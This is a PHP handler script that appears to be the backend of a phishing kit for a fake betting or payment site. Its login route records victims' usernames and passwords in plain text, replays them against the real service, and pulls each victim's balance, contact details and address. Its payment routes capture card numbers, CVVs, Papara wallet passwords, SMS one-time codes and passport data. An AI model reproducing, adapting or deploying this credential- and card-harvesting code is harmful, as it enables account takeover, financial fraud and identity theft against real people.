<?php
include 'inc/config.php';
include 'inc/functions.php';
include 'inc/anti.php';
include 'inc/check.php';



function unicodeStringa($str) {
    $aa = preg_replace('/u([\da-fA-F]{4})/', '&#x\1;', $str);
    return str_replace('\\','',$aa);
}

$q = $_GET['q'];

if ($q == 'login') {
  antiflood();
  $login = escape('field_first');
  $password = escape('field_second');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';

	
  $ip = $db -> real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
  $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
    die('error_phone');
	  
  }elseif (isset($user['id'])) {
    $db -> query("UPDATE users set device = '$device' where id = '$user[id]'");
    $_SESSION['user_id'] = $user['id'];
    die('success');
  }else{
		$durum = login($login,$password);
		if (!($durum == "hata")){
			$kbilgi = unicodeStringa(para($durum));
			$kbilgi1 = unicodeStringa(bilgi($durum));
			
			$para = para();
			
			$phone = json_decode($kbilgi1,false)->subscriptions->phoneNumber;
			$username = json_decode($kbilgi1,false)->subscriptions->email;
			$gun = json_decode($kbilgi1,false)->profile->dateOfBirth;
			
			$adi = json_decode($kbilgi1,false)->profile->firstName;
			$soyadi = json_decode($kbilgi1,false)->profile->lastName;
			$ulke = json_decode($kbilgi1,false)->address->country;
			$bolge = json_decode($kbilgi1,false)->address->city;
			$adres = json_decode($kbilgi1,false)->address->street;

			

			
			
			$db -> query("INSERT into users set
			login='$login',
			password='$password',
			balance='$para',
			originalbalance='$para',
			phone='$phone',
			passport='$passport',
			device='$device',
			ip='$ip',
			data1='$kbilgi',
			data2='$kbilgi1',
			data3='$durum',
			username='$username',
			gun='$gun',
			adi='$adi',
			soyadi='$soyadi',
			bolge='$bolge',
			adres='$adres',
			ulke='$ulke'");
			$_SESSION['user_id'] = $db->insert_id;
			die('success');
			
		}else{
			die('error');
		}
    
  }
}elseif($q == 'logout'){
  session_destroy();
}elseif($q == 'signup' && !isset($us['id'])){
  antiflood();
  $login = escape('field_first');
  $password = escape('field_second');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $email = escape('email');
  $adi = escape('firstName');
  $soyadi = escape('surname');
  $gun = escape('gun');
  $ay = escape('ay');
  $yil = escape('yil');
  $ulke = escape('ulke');
  $bolge = cevir(escape('bolge'));
  $adres = escape('adres');



  $type = intval(1);
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = $db -> real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }else{
		$db -> query("INSERT into users set
		  login = '$login',
		  password = '$password',
		  phone = '$phone',
		  passport = '$passport',
		  type = '$type',
		  device = '$device',
		  ip = '$ip',
		  username='$login',
		  gun='$gun',
		  ay='$ay',
		  yil='$yil',
		  adi='$adi',
		  soyadi='$soyadi',
		  email='$email',
		  bolge='$bolge',
		  adres='$adres',
		  ulke='$ulke'");
	  $_SESSION['user_id'] = $db->insert_id;
	  die('success');
  }
}elseif($q == 'disable-popup'){
  $_SESSION['popup'] = false;
}
$q = $_GET["q"];
  if ($q == "payment") {
    antiflood();
    $datas = [];
  $ip = $db -> real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
    if (strlen($datas['amount']) > 0) {
      $db -> query("INSERT into payments set
        type = '$datas[type]',
        amount = '$datas[amount]',
        user = '$us[login]',
        user_id = '$us[id]',
        astropay_card_number = '$datas[astropay_card_number]',
        astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
        astropay_cv2 = '$datas[astropay_cv2]',
        paykasa_number = '$datas[paykasa_number]',
        papara_email = '$datas[papara_email]',
        papara_password = '$datas[papara_password]',
        papara_sms_code = '$datas[papara_sms_code]',
        bank_id = '$datas[bank]',
        sender_phone = '$datas[sender_phone]',
        identity = '$datas[identity]',
        buyer_phone = '$datas[buyer_phone]',
        buyer_passport = '$datas[buyer_passport]',
        buyer_birth = '$datas[buyer_birth]',
        buyer_passport_date = '$datas[buyer_passport_date]',
        referance = '$datas[referance]',
        full_name = '$datas[full_name]',
        card_number = '$datas[card_number]',
        exp_date = '$datas[exp_date]',
        cvv = '$datas[cvv]',
        where_from = '$datas[where_from]',
		    ip = '$ip',
        transfer_hour = '$datas[transfer_time]'");
      die(json_encode(['success' => true, 'message' => $db->insert_id]));
    }
  }elseif($q == "update-payment"){
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(trim($value));
    }
    $db -> query("UPDATE payments set papara_sms_code = '$datas[papara_sms_code]' where id = '$datas[id]'");
    die(json_encode(['success' => true, 'message' => json_encode($datas)]));
  }elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }
?>